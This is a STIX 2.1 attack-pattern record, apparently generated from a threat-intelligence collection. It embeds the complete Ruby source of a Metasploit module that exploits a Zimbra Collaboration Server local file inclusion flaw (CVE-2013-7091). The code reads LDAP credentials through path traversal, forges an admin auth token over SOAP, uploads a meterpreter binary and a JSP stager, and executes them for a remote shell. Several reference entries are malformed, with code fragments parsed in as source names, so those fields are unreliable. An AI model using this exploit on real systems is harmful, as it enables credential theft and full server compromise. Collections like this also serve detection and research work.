{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9ee913fb-23ec-4cee-8739-97b1067dd2b0",
    "created": "2024-08-14T17:12:21.573601Z",
    "modified": "2024-08-14T17:12:21.573605Z",
    "name": "Zimbra Collaboration Server LFI",
    "description": " This module exploits a local file inclusion on Zimbra 8.0.2 and 7.2.2. The vulnerability allows an attacker to get the LDAP credentials from the localconfig.xml file. The stolen credentials allow the attacker to make requests to the service/admin/soap API. This can then be used to create an authentication token for the admin web interface. This access can be used to achieve remote code execution. This module has been tested on Zimbra Collaboration Server 8.0.2 with Ubuntu Server 12.04. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/zimbra_lfi.rb",
            "external_id": "zimbra_lfi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-7091"
        },
        {
            "source_name": "reference",
            "url": "http://cxsecurity.com/issue/WLB-2013120097"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-UnabletoaccessvulnerableURL\")"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-UnabletoaccessserviceURL\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include REXML\n\n  Rank = ExcellentRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Zimbra Collaboration Server LFI',\n      'Description'     => %q{\n        This module exploits a local file inclusion on Zimbra 8.0.2 and 7.2.2. The vulnerability\n        allows an attacker to get the LDAP credentials from the localconfig.xml file. The stolen\n        credentials allow the attacker to make requests to the service/admin/soap API. This can\n        then be used to create an authentication token for the admin web interface. This access\n        can be used to achieve remote code execution. This module has been tested on Zimbra\n        Collaboration Server 8.0.2 with Ubuntu Server 12.04.\n      },\n      'Author'          =>\n        [\n          'rubina119', # Vulnerability discovery\n          'Mekanismen <mattias[at]gotroot.eu>' # Metasploit module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'CVE', '2013-7091' ],\n          [ 'OSVDB', '100747' ],\n          [ 'BID', '64149' ],\n          [ 'EDB', '30085' ],\n          [ 'URL', 'http://cxsecurity.com/issue/WLB-2013120097' ]\n        ],\n      'Privileged'      => false,\n      'Platform'        => ['linux'],\n      'Targets'         =>\n        [\n         [ 'Zimbra 8.0.2 / Linux',\n            {\n              'Arch'      => ARCH_X86,\n              'Platform'  => 'linux'\n            }\n          ],\n        ],\n      'DefaultOptions'  =>\n        {\n          'SSL'         => true\n        },\n      'DefaultTarget'   => 0,\n      'DisclosureDate'  => '2013-12-06'\n    ))\n    register_options(\n      [\n        Opt::RPORT(7071),\n        OptString.new('TARGETURI', [true, 'Path to zimbraAdmin web application', '/zimbraAdmin']),\n        OptInt.new('DEPTH', [true, 'Traversal depth until to reach the root path', 9]),\n        OptString.new('ZIMBRADIR', [true, 'Zimbra installation path on the target filesystem (/opt/zimbra by default)', '/opt/zimbra'])\n      ])\n  end\n\n  def check\n    res = send_traversal_query(traversal_path(\"conf/localconfig.xml\"))\n\n    unless res and res.code == 200\n      return Exploit::CheckCode::Safe\n    end\n\n    #this response is ~100% gzipped\n    begin\n      text =  Rex::Text.ungzip(res.body)\n    rescue Zlib::GzipFile::Error\n      text = res.body\n    end\n\n    if text =~ /name=\\\\\"zimbra_user\\\\\">\";\\sa\\[\"<value>(.*)<\\/value>/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status(\"Getting login credentials...\")\n    res = send_traversal_query(traversal_path(\"conf/localconfig.xml\"))\n\n    unless res and res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Unable to access vulnerable URL\")\n    end\n\n    #this response is ~100% gzipped\n    begin\n      text =  Rex::Text.ungzip(res.body)\n    rescue Zlib::GzipFile::Error\n      text = res.body.to_s\n    end\n\n    if text =~ /name=\\\\\"zimbra_user\\\\\">\";\\sa\\[\"<value>(.*)<\\/value>/\n      zimbra_user = $1\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to get login credentials\")\n    end\n\n    if text =~ /name=\\\\\"zimbra_ldap_password\\\\\">\";\\sa\\[\"<value>(.*)<\\/value>/\n      zimbra_pass = $1\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to get login credentials\")\n    end\n\n    print_good(\"Got login credentials!\")\n    print_status(\"Getting auth token...\")\n\n    soap_req = build_soap_req(zimbra_user, zimbra_pass) #lets get our hands foamy\n\n    res = send_request_cgi({\n      'uri'             => normalize_uri(\"service\", \"admin\", \"soap\"),\n      'method'          => 'POST',\n      'ctype'           => 'application/soap+xml; charset=\"utf-8\"',\n      'headers'         =>\n        {\n          'SOAPAction'  => '\"urn:zimbraAdmin#AuthRequest\"',\n        },\n      'data'            => soap_req\n    })\n\n    unless res and res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Unable to access service URL\")\n    end\n\n    if res.body.to_s =~ /<authToken>(.*)<\\/authToken>/\n      auth_token = $1\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to get auth token\")\n    end\n\n    @cookie =  \"ZM_ADMIN_AUTH_TOKEN=#{auth_token}\"\n    print_good(\"Got auth token!\")\n\n    #the initial POC for this vuln shows user creation with admin rights for the web interface, thats cool but a shell is even cooler\n    #the web interface has a function to upload the latest version of the desktop client via /service/extension/clientUploader/upload/\n    #the intent is for a ZCO file, whatever that is. However any file will do and it's placed in /downloads/ which we can reach, how handy!\n\n    #push our meterpreter and then a stager jsp file that sets correct permissions, executes the meterpreter and removes itself afterwards\n    payload_name = rand_text_alpha(8+rand(8))\n    stager_name = rand_text_alpha(8+rand(8)) + \".jsp\"\n\n    stager = gen_stager(payload_name)\n    payload_elf = generate_payload_exe\n\n    #upload payload\n    print_status(\"Uploading payload\")\n    res = upload_file(payload_name, payload_elf)\n\n    unless res and res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Unable to get upload payload\")\n    end\n\n    #upload jsp stager\n    print_status(\"Uploading jsp stager\")\n    res = upload_file(stager_name, stager)\n\n    unless res and res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Unable to upload stager\")\n    end\n\n    register_files_for_cleanup(\n      \"../jetty/webapps/zimbra/downloads/#{stager_name}\",\n      \"../jetty/webapps/zimbra/downloads/#{payload_name}\"\n    )\n\n    print_status(\"Executing payload on /downloads/#{stager_name}\")\n\n    res = send_request_cgi({\n      'uri'             => normalize_uri(\"downloads\", stager_name),\n      'method'          => 'GET',\n    })\n  end\n\n  def traversal_path(file_name)\n    ::File.join(\n      \"../\" * datastore['DEPTH'],\n      datastore['ZIMBRADIR'],\n      file_name\n    )\n  end\n\n  def send_traversal_query(traversal)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"res\", \"/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz\"),\n      'method' => 'GET',\n      'encode_params' => false,\n      'vars_get' => {\n       'v' => \"091214175450\",\n       'skin' => \"#{traversal}%00\"\n      }\n    })\n\n    return res\n  end\n\n  def upload_file(file_name, data)\n    req_id = rand_text_numeric(2).to_s\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"#{file_name}\", nil, nil, \"form-data; name=\\\"filename1\\\"\")\n    post_data.add_part(\"#{data}\", \"application/octet-stream\", nil, \"form-data; name=\\\"clientFile\\\"; filename=\\\"#{file_name}\\\"\")\n    post_data.add_part(\"#{req_id}\", nil, nil, \"form-data; name=\\\"requestId\\\"\")\n\n    n_data = post_data.to_s\n\n    res = send_request_cgi({\n      'uri'             => normalize_uri(\"service\", \"extension\", \"clientUploader\", \"upload\"),\n      'method'          => 'POST',\n      'ctype'           => 'multipart/form-data; boundary=' + post_data.bound,\n      'data'            => n_data,\n      'cookie'          => @cookie\n    })\n\n    return res\n  end\n\n  def build_soap_req(zimbra_user, zimbra_pass)\n    xml = Document.new\n    soap_var = \"ns1:AuthRequest\"\n\n    xml.add_element(\n      \"soapenv:Envelope\",\n      {\n        'xmlns:xsi'     => \"http://www.w3.org/2001/XMLSchema-instance\",\n        'xmlns:xsd'     => \"http://www.w3.org/2001/XMLSchema\",\n        'xmlns:soapenv' => \"http://schemas.xmlsoap.org/soap/envelope/\",\n        'xmlns:ser'     => \"http://service.emulation.ws.mercury.com\",\n        'xmlns:env'     => \"http://www.w3.org/2003/05/soap-envelope\",\n        'xmlns:ns1'     => \"urn:zimbraAdmin\",\n        'xmlns:ns2'     => \"urn:zimbraAdmin\",\n     })\n\n    xml.root.add_element(\"soapenv:Header\")\n    xml.root.add_element(\"soapenv:Body\")\n\n    header = xml.root.elements[1]\n    body = xml.root.elements[2]\n\n    header.add_element(\"ns2:context\")\n    body.add_element(\"ns1:AuthRequest\")\n\n    ns1 =  body.elements[1]\n    ns1.add_element(\n      \"account\",\n      {\n        'by' => \"name\"\n      })\n\n    ns1.add_element(\"password\")\n\n    ns1.elements[\"account\"].text  = \"#{zimbra_user}\"\n    ns1.elements[\"password\"].text = \"#{zimbra_pass}\"\n\n    return xml.to_s\n  end\n\n  def gen_stager(payload_name)\n    stager  = \"<%@ page import=\\\"java.util.*,java.io.*\\\"%>\"\n    stager += \" <%\"\n    stager += \" String uri = request.getRequestURI();\"\n    stager += \" String filename = uri.substring(uri.lastIndexOf(\\\"/\\\")+1);\"\n    stager += \" String jspfile = new java.io.File(application.getRealPath(request.getRequestURI())).getParent() + \\\"/\\\" + filename;\"\n    stager += \" String payload = new java.io.File(application.getRealPath(request.getRequestURI())).getParent() + \\\"/#{payload_name}\\\";\"\n    stager += \" Process p = Runtime.getRuntime().exec(\\\"chmod 700 \\\" + payload);\"\n    stager += \" p.waitFor();\"\n    stager += \" p = Runtime.getRuntime().exec(\\\"bash -c '\\\" + payload + \\\"'\\\");\"\n    stager += \"%>\"\n\n    return stager\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-06",
    "x_mitre_platforms": [
        "linux"
    ]
}